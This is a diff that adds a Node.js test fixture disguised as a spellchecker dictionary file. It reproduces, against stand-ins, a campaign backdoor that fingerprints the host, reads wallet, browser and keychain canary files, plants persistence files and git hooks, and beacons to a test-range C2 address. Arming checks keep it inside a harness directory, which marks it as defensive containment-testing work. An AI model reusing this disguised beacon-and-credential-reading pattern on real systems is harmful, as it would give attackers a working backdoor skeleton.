@@ -1,0 +1,130 @@
+// spellright user dictionary
+// words: orderbook matcher bid ask
+/*
+ * Contagious-Interview stage, INERT REPRODUCTION (test fixture; EDR fixture-safety).
+ * The campaign hides its node backdoor in a "dictionary" file run by a hidden
+ * folder-open task. This stand-in does what the real one does, against stand-ins only:
+ *   - fingerprint the host (hostname, MACs, OS) and ask an IP-echo service for the
+ *     public IP (ipify stand-in: a reserved *.test name);
+ *   - beacon every 5 s to a C2 on a raw IP (RFC 5737 TEST-NET) and to the run's loopback
+ *     beacon (the vercel.app stand-in), and would eval tasking (never: it only records
+ *     whether any arrived);
+ *   - read credential stores (wallet, browser profile, solana id.json, keychain): only
+ *     harness-seeded canary files under the run dir, never real paths;
+ *   - drop persistence into ~/.vscode and ~/.n2 (only inside a tab, i.e. into the tab's
+ *     own home; anywhere else it writes under the run dir instead);
+ *   - plant host-executed code in the workspace (.git/hooks/pre-commit, .envrc) with an
+ *     inert body, so the write-back gate can be tested.
+ * Inert unless .seclab/targets arms it: 32-hex nonce, a run dir containing this
+ * workspace, an unexpired window, and every target path inside the run dir.
+ */
+'use strict';
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
+const http = require('http');
+
+const ws = path.resolve(__dirname, '..');
+const t = {};
+try {
+	for (const l of fs.readFileSync(path.join(ws, '.seclab', 'targets'), 'utf8').split('\n')) {
+		const i = l.indexOf('=');
+		if (i > 0) t[l.slice(0, i)] = l.slice(i + 1);
+	}
+} catch { process.exit(0); }
+const run = t.run || '';
+const inRun = p => !p || (path.isAbsolute(p) && !p.split(path.sep).includes('..') && p.startsWith(run + path.sep));
+if (!/^[0-9a-f]{32}$/.test(t.arm || '') || !path.isAbsolute(run) || !(ws + path.sep).startsWith(run + path.sep)) process.exit(0);
+// The run dir must be a harness location (a worktree's .work/ or ~/.seclab-test/), so tab-side
+// code that rewrites .seclab/targets can't aim an escaped stage at the user's files.
+if (!/\/\.work\/|\/\.seclab-test\//.test(run + '/')) process.exit(0);
+if (!/^[0-9]+$/.test(t.until || '') || Date.now() / 1000 >= Number(t.until)) process.exit(0);
+const canaryKeys = ['wallet', 'browser', 'solana', 'keychain'];
+if (![t.marker, ...canaryKeys.map(k => t[k])].every(inRun)) process.exit(0);
+const loopback = /^[0-9]{1,5}$/.test(t.loopback || '') ? Number(t.loopback) : 0;
+
+// Inside a tab: the tab environment, its tooling, and the hostname of the tab the harness
+// armed (sbx: the sandbox name; OCI: "tab"). Anywhere else the drops go under the run dir.
+const inTab = process.env.SECLAB_TAB === '1' && fs.existsSync('/opt/seclab/bin/seclab-tab-env')
+	&& /^t-[a-z2-7]{26}$/.test(t.tab || '') && (os.hostname() === `seclab-${t.tab}` || os.hostname() === 'tab');
+const out = path.join(ws, '.seclab-evidence');
+fs.mkdirSync(out, { recursive: true });
+const ev = {
+	vector: 'contagious', in_tab: inTab, pid: process.pid, hostname: os.hostname(), platform: os.platform(), release: os.release(), uid: process.getuid?.(),
+	macs: Object.values(os.networkInterfaces()).flat().map(n => n && n.mac).filter(m => m && m !== '00:00:00:00:00:00'),
+	ipify: {}, beacons: [], tasking_received: false, canaries: {}, drops: [], planted: [], marker_written: false,
+};
+const save = () => fs.writeFileSync(path.join(out, 'contagious.json'), JSON.stringify(ev, null, 1));
+
+// One HTTP GET; through the env proxy when `proxy` (as axios-based loaders do).
+function get(url, proxy) {
+	return new Promise(resolve => {
+		const u = new URL(url);
+		let opts = { host: u.hostname, port: u.port || 80, path: u.pathname + u.search, timeout: 4000 };
+		const p = proxy && (process.env.http_proxy || process.env.HTTP_PROXY);
+		if (p) {
+			const pu = new URL(p);
+			opts = { host: pu.hostname, port: pu.port || 80, path: url, timeout: 4000, headers: { host: u.host } };
+		}
+		const req = http.get(opts, res => {
+			let n = 0;
+			res.on('data', d => { n += d.length; });
+			res.on('end', () => resolve({ status: res.statusCode, bytes: n }));
+		});
+		req.on('timeout', () => req.destroy(new Error('timeout')));
+		req.on('error', e => resolve({ error: String(e.code || e.message).slice(0, 40) }));
+	});
+}
+
+(async () => {
+	ev.ipify.direct = await get('http://api.ipify.example.test/?format=json', false);
+	ev.ipify.via_proxy = await get('http://api.ipify.example.test/?format=json', true);
+
+	for (const k of canaryKeys) {
+		try { fs.readFileSync(t[k]); ev.canaries[k] = 'read'; } catch { ev.canaries[k] = 'denied'; }
+	}
+
+	// Persistence drops: the tab's own home when inside a tab; otherwise under the run dir.
+	const home = inTab ? os.homedir() : path.join(run, 'drops');
+	for (const rel of [path.join('.vscode', 'seclab-ci-drop.js'), path.join('.n2', 'seclab-ci-drop')]) {
+		const p = path.join(home, rel);
+		try { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, `// seclab-ci drop ${t.arm}\n`); ev.drops.push(p); } catch { /* recorded by absence */ }
+	}
+
+	// Host-executed code planted in the workspace (inert bodies). The write-back gate must
+	// keep these off the host checkout.
+	const plants = [[path.join('.git', 'hooks', 'pre-commit'), `#!/bin/sh\n# seclab-ci planted ${t.arm}\nexit 0\n`, 0o755], ['.envrc', `# seclab-ci planted ${t.arm}\n`, 0o644]];
+	for (const [rel, body, mode] of plants) {
+		const p = path.join(ws, rel);
+		try {
+			if (rel.startsWith('.git') && !fs.existsSync(path.join(ws, '.git'))) continue;
+			fs.mkdirSync(path.dirname(p), { recursive: true });
+			fs.writeFileSync(p, body, { mode });
+			ev.planted.push(rel);
+		} catch { /* recorded by absence */ }
+	}
+
+	// Escaped containment: leave the run's marker so the harness sees it. Exclusive create:
+	// never truncates or follows an existing file or link.
+	if (!inTab && t.marker) {
+		try { fs.writeFileSync(t.marker, 'pwned by contagious\n', { flag: 'wx' }); ev.marker_written = true; } catch { /* nothing */ }
+	}
+	save();
+
+	// Beacon loop: every 5 s, bounded; stays alive afterwards (until the arming window ends)
+	// so the harness can check the process dies with the tab.
+	const max = Math.min(Number(t.beacons || 3), 10);
+	for (let i = 0; i < max; i++) {
+		const b = { t: Date.now(), c2_rawip: await get('http://192.0.2.10:8443/api/v1/ping', false), c2_rawip_proxy: await get('http://192.0.2.10:8443/api/v1/ping', true) };
+		if (loopback) {
+			b.loopback = await get(`http://host.docker.internal:${loopback}/api/beacon`, false);
+			b.loopback_proxy = await get(`http://host.docker.internal:${loopback}/api/beacon`, true);
+		}
+		ev.tasking_received ||= [b.c2_rawip, b.c2_rawip_proxy, b.loopback, b.loopback_proxy].some(r => r && r.status === 200 && r.bytes > 0);
+		ev.beacons.push(b);
+		save();
+		await new Promise(r => setTimeout(r, 5000));
+	}
+	const left = Math.min(Number(t.until) * 1000 - Date.now(), 15 * 60 * 1000);
+	if (left > 0) setTimeout(() => process.exit(0), left);
+})();
